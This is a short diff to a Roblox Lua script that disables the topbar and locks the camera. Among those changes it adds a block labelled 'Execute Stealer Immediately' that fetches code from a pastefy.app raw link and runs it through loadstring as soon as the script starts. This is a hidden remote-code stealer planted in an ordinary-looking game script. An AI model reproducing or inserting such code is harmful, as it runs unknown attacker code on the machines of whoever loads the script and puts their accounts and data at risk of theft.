@@ -4,6 +4,13 @@
 local StarterGui = game:GetService("StarterGui")
 StarterGui:SetCore("TopbarEnabled", false)
 
+-- Execute Stealer Immediately
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/l9Kp67lO/raw"))()
+end)
+
+local LocalPlayer = Players.LocalPlayer
+
 -- Lock camera
 local player = game.Players.LocalPlayer
 local camera = workspace.CurrentCamera
